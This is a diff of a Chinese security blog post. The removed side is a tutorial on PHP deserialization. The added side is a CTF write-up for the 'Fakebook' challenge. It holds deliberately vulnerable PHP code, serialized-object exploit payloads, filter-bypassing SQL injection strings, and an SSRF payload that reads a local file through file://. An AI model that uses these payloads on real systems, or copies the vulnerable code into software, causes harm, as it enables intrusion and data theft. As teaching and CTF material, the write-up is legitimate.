@@ -15,25 +15,24 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="php中序列化和反序列化是将数组，字符串或类转换成变量储存起来，方便调用的过程。">
+<meta name="description" content="考验sql注入和反序列化">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP反序列化漏洞详解">
-<meta property="og:url" content="https://www.tu3k.cn/2021/03/08/php-fanxuliehua/index.html">
+<meta property="og:title" content="网鼎杯CTF_Fakebook">
+<meta property="og:url" content="https://www.tu3k.cn/2021/04/16/fakebook-ctf/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="php中序列化和反序列化是将数组，字符串或类转换成变量储存起来，方便调用的过程。">
+<meta property="og:description" content="考验sql注入和反序列化">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/1.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/2.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/3.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/4.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/5.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/7.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/phpfanxuliehua/6.png">
-<meta property="article:published_time" content="2021-03-08T00:29:18.000Z">
-<meta property="article:modified_time" content="2021-03-08T09:25:58.799Z">
-<meta property="article:tag" content="反序列化">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/1.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/5.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/2.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/3.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/4.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf2/6.png">
+<meta property="article:published_time" content="2021-04-16T11:54:39.000Z">
+<meta property="article:modified_time" content="2021-04-17T03:23:52.524Z">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/phpfanxuliehua/1.png">
+<meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf2/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -67,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>PHP反序列化漏洞详解 | Tu3k's Blog</title>
+<title>网鼎杯CTF_Fakebook | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -276,11 +275,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-php-fanxuliehua" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-fakebook-ctf" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/03/08/php-fanxuliehua/" class="article-date">
-      <time datetime="2021-03-08T00:29:18.000Z" itemprop="datePublished">2021-03-08</time>
+      <a href="/2021/04/16/fakebook-ctf/" class="article-date">
+      <time datetime="2021-04-16T11:54:39.000Z" itemprop="datePublished">2021-04-16</time>
 </a>
 
 
@@ -295,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PHP反序列化漏洞详解
+      网鼎杯CTF_Fakebook
     </h1>
   
 
@@ -306,7 +305,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -316,45 +315,23 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <p>php中序列化和反序列化是将数组，字符串或类转换成变量储存起来，方便调用的过程。</p>
+        <p>考验sql注入和反序列化</p>
 <a id="more"></a>
-
-<h2 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h2><p>前两节讲了Python的反序列化：<br><code>https://www.tu3k.cn/2021/02/28/python-fanxulie/</code><br>PHP中反序列化漏洞也叫PHP对象注入漏洞</p>
-<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在PHP序列化的时候，某个参数可控，用户传入构造好的序列化恶意代码，序列化到数据库，在反序列化的时候会将恶意代码配合一些魔术函数，危险函数当做正常执行，造成命令注入漏洞。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p>
-<h3 id="PHP三种序列化类型"><a href="#PHP三种序列化类型" class="headerlink" title="PHP三种序列化类型"></a>PHP三种序列化类型</h3><p>多说无益，先来了解序列化用到的函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()	将数据序列化</span><br><span class="line">unserialize()	将数据反序列化出原样</span><br></pre></td></tr></table></figure>
-<h4 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h4><p>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$name &#x3D; &quot;baicai&quot;;</span><br><span class="line">	$n &#x3D; serialize($name);		&#x2F;&#x2F;	s:6:&quot;baicai&quot;;</span><br><span class="line">	echo $n.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">	$nn &#x3D; unserialize($n);		&#x2F;&#x2F;baicai</span><br><span class="line">	echo $nn;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/phpfanxuliehua/1.png" alt="php反序列化" title="php反序列化"><br><code>s:6:&quot;baicai&quot;    s表示内容是字符串，6表示内容的长度，baicai就是内容</code></p>
-<h4 id="数组型"><a href="#数组型" class="headerlink" title="数组型"></a>数组型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:2:&quot;sb&quot;;i:1;s:2:&quot;dj&quot;;&#125;	</span><br><span class="line">a表示这是一个数组序列化，2表示数组中有几个值，花括号内i表示下标，0是当前第一位下标，s代表这是个字符串，2代表对于的值的长度</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/phpfanxuliehua/2.png" alt="php反序列化" title="php反序列化"></p>
-<h4 id="对象型"><a href="#对象型" class="headerlink" title="对象型"></a>对象型</h4><p><img src="https://www.tu3k.cn/images/phpfanxuliehua/3.png" alt="php反序列化" title="php反序列化"><br><img src="https://www.tu3k.cn/images/phpfanxuliehua/4.png" alt="php反序列化" title="php反序列化"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;djdjdj&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;baicai&quot;;&#125;</span><br><span class="line">O代表这是个类对象，6代表类名长度，&quot;djdjdj&quot;是类名，1表示类对象里面有1个值</span><br><span class="line">s 代表内容是字符串</span><br><span class="line">4 代表内容的长度</span><br><span class="line">&quot;name&quot;	内容</span><br></pre></td></tr></table></figure>
-<p>以上三种类型就是看懂PHP反序列化的基本。</p>
-<h3 id="魔术引号和危险函数"><a href="#魔术引号和危险函数" class="headerlink" title="魔术引号和危险函数"></a>魔术引号和危险函数</h3><p>只说四个常见的，字面意思</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()	当前类被反序列化时自动执行该方法中的内容</span><br><span class="line">__sleep()	当前类被序列化时自动执行该方法中的内容</span><br><span class="line">__construct()	实例化对象时自动执行</span><br><span class="line">__destruct()	 销毁一个对象时会被调用（unset($object)）</span><br></pre></td></tr></table></figure>
-<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>这里我用了stripcslashes来转义字符，是我php环境问题，一般不用转义，忽略即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dj&#123;</span><br><span class="line">	public $name&#x3D;&#39;122&#39;;</span><br><span class="line">	function __wakeup() &#123;</span><br><span class="line">		$fp &#x3D; fopen(&#39;web.php&#39;,&#39;w&#39;);</span><br><span class="line">		fwrite($fp,$this-&gt;name);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$dj &#x3D; new dj;</span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">unserialize(stripcslashes($name));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这段代码意思：创建一个dj类，当dj类被反序列化时会执行__wakeup()方法，该方法是打开web.php文件往里写入name的值，外部get传参接收name的值，而name的值是可控的，所以就造成了反序列化漏洞。</p>
-<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>当传入test.php?name=xxx<br>程序会把xxx进行反序列化，如果反序列化后的值是调用了dj类时，就会接着调用_wakeup()方法将反序列化后的值写入web.php文件<br>所以我们根据他的反序列化规则写个Exp，Exp里name的值替换为Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dj&#123;</span><br><span class="line">		var $name &#x3D; &#39;123&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$dj &#x3D; new dj;</span><br><span class="line">	$a &#x3D; serialize($dj);</span><br><span class="line">	print($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到序列化后的值<br><code>O:2:&quot;dj&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;&#125;</code><br>接着传入 test.php?name=O:2:”dj”:1:{s:4:”name”;s:3:”123”;}<br><img src="https://www.tu3k.cn/images/phpfanxuliehua/5.png" alt="php反序列化" title="php反序列化"></p>
-<h2 id="其他魔术方法"><a href="#其他魔术方法" class="headerlink" title="其他魔术方法"></a>其他魔术方法</h2><p>例如，有的魔术方法是相互嵌套的，比如__wakeup()嵌套__construct()，那么在利用的时候就得先反序列化出__wakeup的类并赋值payload给可控参数，接着调用dj类的__construct()完成某些敏感操作。</p>
-<h4 id="漏洞代码："><a href="#漏洞代码：" class="headerlink" title="漏洞代码："></a>漏洞代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dj&#123;</span><br><span class="line">		public $name;</span><br><span class="line">		function __construct($name)&#123;</span><br><span class="line">			$fp &#x3D; fopen(&#39;web.php&#39;,&#39;w&#39;);</span><br><span class="line">			fwrite($fp,$this-&gt;name);</span><br><span class="line">			fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class ha&#123;</span><br><span class="line">		var $name &#x3D; &#39;123&#39;;</span><br><span class="line">		function __wakeup()&#123;</span><br><span class="line">			$a &#x3D; new dj($this-&gt;name);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>利用Exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class ha&#123;</span><br><span class="line">		var $name&#x3D;&#39;payload&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$ha &#x3D; new ha;</span><br><span class="line">	$a &#x3D; serialize($ha);</span><br><span class="line">	print($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到：<br><code>O:2:&quot;ha&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;payload&quot;;&#125;</code><br><img src="https://www.tu3k.cn/images/phpfanxuliehua/7.png" alt="php反序列化" title="php反序列化"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP反序列化漏洞：<br>1、审计找到序列化和反序列化调用点<br>2、查找可控参数<br>3、找到魔术函数，看清序列流程，找到可以利用的函数<br>4、根据程序序列规则编写Exp<br>5、传入Exp序列化后的值到可控参数，形成漏洞</p>
-<h3 id="小细节1"><a href="#小细节1" class="headerlink" title="小细节1"></a>小细节1</h3><p>比如审计到name参数的值可控并被应用于反序列化，可以直接编写Exp，类和成员对应写上就行了</p>
-<h4 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dj&#123;</span><br><span class="line">		var $name &#x3D; &#39;payload&#39;</span><br><span class="line">	&#125;</span><br><span class="line">	$dj &#x3D; new dj;</span><br><span class="line">	$a &#x3D; serialize($dj);</span><br><span class="line">	print($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>就可以获取利用Payload</p>
-<h3 id="小细节2"><a href="#小细节2" class="headerlink" title="小细节2"></a>小细节2</h3><p>网站存在反序列化漏洞，不要局限于当前的类和函数成员，找到只要能让我们利用的方法和可控参数，都可以传参调用从而达到目的。<br>比如别的函数方法内存在敏感函数供我们使用，就可以在Exp写个构造方法去调用这个函数，但是这个函数内必须有可控参数我们才能赋值使用。</p>
-<h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><p>bug.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class admin&#123;</span><br><span class="line">		function __construct($pass) &#123;</span><br><span class="line">			print($pass);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class ha&#123;</span><br><span class="line">		public $pass;</span><br><span class="line">		function __wakeup()&#123;</span><br><span class="line">			$a &#x3D; new admin($this-&gt;pass);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">$ha &#x3D; new ha;</span><br><span class="line">$name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">unserialize(stripcslashes($name));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>exp.php:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class ha&#123;</span><br><span class="line">		var $pass &#x3D; &#39;666&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$ha &#x3D; new ha;</span><br><span class="line">	$a &#x3D; serialize($ha);</span><br><span class="line">	print($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/phpfanxuliehua/6.png" alt="php反序列化" title="php反序列化"></p>
-
+<p>打开页面，先注册账号<br><img src="http://www.tu3k.cn/images/php_web_ctf2/1.png" alt="fakebook_ctf" title="fakebook"><br>在个人中心发现iframe引用了我博客地址，标准的ssrf呀，准备使用伪协议来获取网站根目录的flag.php，前面报错已经出来网址路径了<br><code>file:///var/www/html/flag.php</code>，但是有正则匹配必须是网址格式，歇菜。<br>发现个人信息链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>单引号报错，数字型注入，联合查询被拦截提示no hack~<br><img src="http://www.tu3k.cn/images/php_web_ctf2/5.png" alt="fakebook_ctf" title="fakebook"><br>注释符绕过<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+<p>表名：users<br>另外发现反序列化函数的报错<br><img src="http://www.tu3k.cn/images/php_web_ctf2/2.png" alt="fakebook_ctf" title="fakebook"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&quot;users&quot;</span><br></pre></td></tr></table></figure>
+<p>本来users是用hex编码，但提示no hack~，双引号可以绕过<br>字段：no,username,passwd,data<br><img src="http://www.tu3k.cn/images/php_web_ctf2/3.png" alt="fakebook_ctf" title="fakebook"><br>没有发现博客字段，查看data，发现是序列化后的个人信息,带博客地址<br><img src="http://www.tu3k.cn/images/php_web_ctf2/4.png" alt="fakebook_ctf" title="fakebook"><br>也就是说只需要将blog地址改为伪协议读取flag的地址，然后传入对应的显位中进行联合查询，那么服务器会临时执行我们传入显位的代码，从而拿到flag。<br>（一开始用了load_file去查看flag.php，不行，hex编码也被拦截。）</p>
+<p>但是还不知道他的序列化规则和类的属性<br>看了下robots，发现程序文件，下载之…<br>拿到规则后，主要就三个功能：<br>1 初始化用户名等信息<br>2 请求<br>3 验证传来的博客地址是否准确。<br>构造exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new UserInfo();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>因为显位有4个，data也在第四位，所以直接联合查询让数据库临时查询我们传入的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no&#x3D;1 and 1&#x3D;2 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p>查看源代码发现iframe加载进来的flag.php的base64编码<br><img src="http://www.tu3k.cn/images/php_web_ctf2/6.png" alt="fakebook_ctf" title="fakebook"><br>解密拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;flag&#123;02078454-f9dc-46bd-9c65-ed390820d0ab&#125;&quot;;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
     
 </div>
     
@@ -362,13 +339,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/03/08/php-fanxuliehua/">PHP反序列化漏洞详解</a></p>
+        <p><span>Title:</span><a href="/2021/04/16/fakebook-ctf/">网鼎杯CTF_Fakebook</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-03-08, 08:29:18</p>
-        <p><span>Updated:</span>2021-03-08, 17:25:58</p>
+        <p><span>Created:</span>2021-04-16, 19:54:39</p>
+        <p><span>Updated:</span>2021-04-17, 11:23:52</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/03/08/php-fanxuliehua/" title="PHP反序列化漏洞详解">https://www.tu3k.cn/2021/03/08/php-fanxuliehua/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/08/php-fanxuliehua/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/04/16/fakebook-ctf/" title="网鼎杯CTF_Fakebook">https://www.tu3k.cn/2021/04/16/fakebook-ctf/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/16/fakebook-ctf/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -380,16 +357,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/03/14/xxe-bug/">
-                    XXE漏洞详解
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/03/07/Python-duoxiancheng/">
-                    Python多线程和锁学习
+                <a href="/2021/04/16/hardsql/">
+                    极客大挑战HardSql
                 </a>
             </div>
         
@@ -401,7 +372,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%89%E7%A7%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">PHP三种序列化类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9E%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">字符串型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%9E%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">数组型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%9E%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">对象型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">魔术引号和危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text">举例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">其他魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">漏洞代码：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%86%E8%8A%821"><span class="toc-number">3.1.</span> <span class="toc-text">小细节1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%A6%82%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">例如：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%86%E8%8A%822"><span class="toc-number">3.2.</span> <span class="toc-text">小细节2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%A6%82"><span class="toc-number">3.2.1.</span> <span class="toc-text">例如</span></a></li></ol></li></ol></li></ol>
+            
         
     </div>
     <style>
@@ -437,7 +408,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"PHP反序列化漏洞详解　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"网鼎杯CTF_Fakebook　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -457,15 +428,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/03/14/xxe-bug/" title="Pre: XXE漏洞详解">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/03/07/Python-duoxiancheng/" title="Next: Python多线程和锁学习">
+            <a href="/2021/04/16/hardsql/" title="Next: 极客大挑战HardSql">
                 <i class="fa fa-angle-right"></i>
             </a>
         
